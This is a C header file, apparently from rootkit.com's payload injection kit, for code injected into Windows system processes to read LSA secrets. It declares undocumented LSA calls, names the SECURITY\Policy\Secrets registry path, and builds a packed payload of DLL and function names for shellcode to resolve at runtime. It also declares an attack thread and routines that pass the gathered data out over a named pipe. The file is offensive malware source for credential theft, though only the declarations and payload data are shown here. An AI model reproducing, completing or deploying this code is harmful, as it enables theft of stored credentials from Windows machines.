
#ifndef __payload_h___
#define __payload_h___

#include "windows.h"

///////////////////////////////////////////////////////////////
// LSA stuff
//
///////////////////////////////////////////////////////////////
typedef struct _LSA_SECRET {
    DWORD Len;
    DWORD MaxLen;
    WCHAR *Buf;
} LSA_SECRET, *PLSA_SECRET;

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

typedef DWORD HPOLICY;
typedef DWORD HSECRET;
typedef unsigned long NTSTATUS;

typedef NTSTATUS (WINAPI *f_LsaIOpenPolicyTrusted) (HPOLICY *);
typedef NTSTATUS (WINAPI *f_LsarOpenSecret) (	HPOLICY, 
												LSA_UNICODE_STRING*,
												DWORD dwAccess, 
												HSECRET*);
typedef NTSTATUS (WINAPI *f_LsarQuerySecret) (	HSECRET,
												PLSA_SECRET*,
												DWORD, 
												DWORD, 
												DWORD);
typedef NTSTATUS (WINAPI *f_LsarClose) (HANDLE);





///////////////////////////////////////////////////////////////
// our jump table for preloaded functions
// typically this is only LoadLibrary & GetProcAddress
// cooresponds directly to the functions in 
// MY_FUNCTION_TABLE.
///////////////////////////////////////////////////////////////
#define GET_PROC_ADDRESS	[ebp]
#define LOAD_LIBRARYW		[ebp + 4]

typedef struct _MY_FUNCTION_TABLE
{
	///////////////////////////////////////////////////////////
	// These must be in the order in which they were loaded in
	// the data payload.
	///////////////////////////////////////////////////////////
	#define fGetProcAddress (*(MFT->pGetProcAddress))
	FARPROC pGetProcAddress;
	
	#define fLoadLibraryW (*(MFT->pLoadLibraryW))
	FARPROC pLoadLibraryW;
	
	#define fGetCurrentProcess (*(MFT->pGetCurrentProcess))
	FARPROC pGetCurrentProcess;
	
	#define fGetLastError (*(MFT->pGetLastError))
	FARPROC pGetLastError;
	
	#define fOutputDebugString (*(MFT->pOutputDebugString))
	FARPROC pOutputDebugString;
	
	#define fSleep (*(MFT->pSleep))
	FARPROC pSleep;
	
	#define fCloseHandle (*(MFT->pCloseHandle))
	FARPROC pCloseHandle;
	
	#define fVirtualQuery (*(MFT->pVirtualQuery))
	FARPROC pVirtualQuery;

	#define fVirtualProtect (*(MFT->pVirtualProtect))
	FARPROC pVirtualProtect;

	#define fWriteFile (*(MFT->pWriteFile))
	FARPROC pWriteFile;

	#define fCreateFileA (*(MFT->pCreateFileA))
	FARPROC pCreateFileA;

	#define fWideCharToMultiByte (*(MFT->pWideCharToMultiByte))
	FARPROC pWideCharToMultiByte;
	
	#define fExitThread (*(MFT->pExitThread))
	FARPROC pExitThread;				

	#define fRegisterEventSource (*(MFT->pRegisterEventSource))
	FARPROC pRegisterEventSource;
	
	#define fDeRegisterEventSource (*(MFT->pDeRegisterEventSource))
	FARPROC pDeRegisterEventSource;
	
	#define fReportEvent (*(MFT->pReportEvent))
	FARPROC pReportEvent;
	
	#define fOpenProcessToken (*(MFT->pOpenProcessToken))
	FARPROC pOpenProcessToken;
	
	#define fLookupPrivilegeValue (*(MFT->pLookupPrivilegeValue))
	FARPROC pLookupPrivilegeValue;

	#define fRegOpenKeyExA (*(MFT->pRegOpenKeyExA))
	FARPROC pRegOpenKeyExA;

	#define fRegEnumKeyW (*(MFT->pRegEnumKeyW))
	FARPROC pRegEnumKeyW;

	#define fLsaFreeMemory (*(MFT->pLsaFreeMemory))
	FARPROC pLsaFreeMemory;

	#define fAdjustTokenPrivileges (*(MFT->pAdjustTokenPrivileges))
	FARPROC pAdjustTokenPrivileges;
	
	#define fServiceEntryPoint (*(MFT->pServiceEntryPoint))
	FARPROC pServiceEntryPoint;

	#define fNtWriteFile (*(MFT->pNtWriteFile))
	FARPROC pNtWriteFile;

	#define fNtReadFile (*(MFT->pNtReadFile))
	FARPROC pNtReadFile;
	
	////////////////////////////////////////////////////////////////
	// MSVCRT functions
	////////////////////////////////////////////////////////////////
	#define f_strlen (*(MFT->p_strlen))
	FARPROC p_strlen;

	#define f_wcslen (*(MFT->p_wcslen))
	FARPROC p_wcslen;

	#define f_snprintf (*(MFT->p_snprintf))
	FARPROC p_snprintf;

	////////////////////////////////////////////////////////////////
	// LSA functions
	////////////////////////////////////////////////////////////////
	#define fLsaIOpenPolicyTrusted (*(MFT->pLsaIOpenPolicyTrusted))
	f_LsaIOpenPolicyTrusted pLsaIOpenPolicyTrusted;
	
	#define fLsarOpenSecret (*(MFT->pLsarOpenSecret))
	f_LsarOpenSecret pLsarOpenSecret;
	
	#define fLsarQuerySecret (*(MFT->pLsarQuerySecret))
	f_LsarQuerySecret pLsarQuerySecret;
	
	#define fLsarClose (*(MFT->pLsarClose))
	f_LsarClose	pLsarClose;

	struct
	{
		const char *	mSecurityString;
		const char *	mSecPrivString;
		const char *	mAuditPrivString;
		const char *	mHelloString;
		const char *	mPipeName;
		const char *    mRegKeySecrets;
		const char *	mTestString;
	} pDATA;

} MY_FUNCTION_TABLE, *PMY_FUNCTION_TABLE;

///////////////////////////////////////////////////////////////
// the Z terminator is so the unicode-conversion routine
// can convert the string to a double null terminated UNICODE
// string.  
//
// Services.exe imports LoadLibraryW - the wide character 
// version of LoadLibrary - so we must use a unicode
// name here.
///////////////////////////////////////////////////////////////
char data[] = 
	  /////////////////////////////////////////////////
	  // rootkit.com's payload injection kit.
	  // das format:
	  // DLL NAME<null>FUNCTION NAMES<null><null>
	  // <null>
	  // DATA<null><null>
	  /////////////////////////////////////////////////

	  /////////////////////////////////////////////////
	  // start data payload
	  /////////////////////////////////////////////////
	  "k.e.r.n.e.l.3.2...d.l.l.Z\0" \
	  /////////////////////////////////////////////////
	  // function names are null terminated.
	  // last function is double null terminated.
	  /////////////////////////////////////////////////
	  "GetCurrentProcess\0" \
	  "GetLastError\0" \
	  "OutputDebugStringA\0" \
	  "Sleep\0" \
	  "CloseHandle\0" \
	  "VirtualQuery\0" \
	  "VirtualProtect\0" \
	  "WriteFile\0" \
	  "CreateFileA\0" \
	  "WideCharToMultiByte\0" \
	  "ExitThread\0\0" \
	  /////////////////////////////////////////////////
	  // next DLL, ADVAPI32.DLL
	  /////////////////////////////////////////////////
	  "A.D.V.A.P.I.3.2...D.L.L.Z\0" \
	  /////////////////////////////////////////////////
	  // eventlog functions
	  // last function is double null terminated.
	  /////////////////////////////////////////////////
	  "RegisterEventSourceA\0" \
	  "DeregisterEventSource\0" \
	  "ReportEventA\0" \
	  "OpenProcessToken\0" \
	  "LookupPrivilegeValueA\0" \
	  "RegOpenKeyExA\0" \
	  "RegEnumKeyW\0" \
	  "LsaFreeMemory\0" \
	  "AdjustTokenPrivileges\0\0" \
	  /////////////////////////////////////////////////
	  // the eventlog.dll entry point
	  /////////////////////////////////////////////////
	  "e.v.e.n.t.l.o.g...d.l.l.Z\0" \
	  "SvcEntry_Eventlog\0\0" \
	  //"ServiceEntry\0\0" 
	  /////////////////////////////////////////////////
	  // next DLL, NTDLL.DLL
	  /////////////////////////////////////////////////
	  "N.T.D.L.L...D.L.L.Z\0" \
	  /////////////////////////////////////////////////
	  // ntdll functions
	  // last function is double null terminated.
	  /////////////////////////////////////////////////
	  "NtWriteFile\0" \
	  "NtReadFile\0\0" \
	  /////////////////////////////////////////////////
	  // the eventlog.dll entry point
	  /////////////////////////////////////////////////
	  "M.S.V.C.R.T...D.L.L.Z\0" \
	  "strlen\0" \
	  "wcslen\0" \
	  "_snprintf\0\0" \
	  /////////////////////////////////////////////////
	  // next DLL, LSASRV.DLL
	  /////////////////////////////////////////////////
	  "l.s.a.s.r.v...d.l.l.Z\0" \
	  /////////////////////////////////////////////////
	  // ntdll functions
	  // last function is double null terminated.
	  /////////////////////////////////////////////////
	  "LsaIOpenPolicyTrusted\0" \
	  "LsarOpenSecret\0" \
	  "LsarQuerySecret\0" \
	  "LsarClose\0\0" \
	  /////////////////////////////////////////////////
	  // <null> DLL name ends loading cycle
	  /////////////////////////////////////////////////
	  "\0" \
	  /////////////////////////////////////////////////
	  // data strings section, double null terminated
	  //
	  // <services keyword>
	  // <priv keyword>
	  // <priv keyword>
	  // <test string>
	  /////////////////////////////////////////////////
	  "Security\0" \
	  "SeSecurityPrivilege\0" \
	  "SeAuditPrivilege\0" \
	  "HELLO LSASS!\0" \
	  "ATT_PIPE\0" \
	  "SECURITY\\Policy\\Secrets\0" \
	  "<ATTACK ME>\0\0";
	  /////////////////////////////////////////////////
	  // end data payload
	  /////////////////////////////////////////////////

///////////////////////////////////////////////////////
// extra crap for local compiler
///////////////////////////////////////////////////////
DWORD WINAPI attack_thread(LPVOID theParam);
void build_rvas();
void convert_ascii_to_unicode(void);
void __stdcall do_something_useful( PMY_FUNCTION_TABLE );
void after_attack(void);
DWORD __stdcall DoLSAWork( MY_FUNCTION_TABLE *MFT, HANDLE theNamedPipeH );
DWORD __stdcall SendPipeData( MY_FUNCTION_TABLE *MFT, HANDLE thePipeH, const char *theText);


BOOL BuildPayloadBuffer( char **theBuffer, int *theLen );
DWORD GetChecksum( char *p );
void test_me(char *input_ptr);

#endif